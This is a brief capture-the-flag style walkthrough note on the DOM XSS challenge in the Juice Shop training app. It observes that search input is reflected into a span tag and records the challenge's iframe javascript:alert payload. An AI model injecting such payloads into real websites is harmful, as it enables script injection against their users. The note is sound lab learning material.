we can see that what we search is reflected:
![[walkthroughs/Juice-Shop/IMG/Pasted image 20230907182058.png]]
into this span tag
![[walkthroughs/Juice-Shop/IMG/Pasted image 20230907182132.png]]
DOM xss?:
![[walkthroughs/Juice-Shop/IMG/Pasted image 20230907182238.png]]
yep yep
so give the payload they gave us:
```
<iframe src="javascript:alert(`xss`)">
```
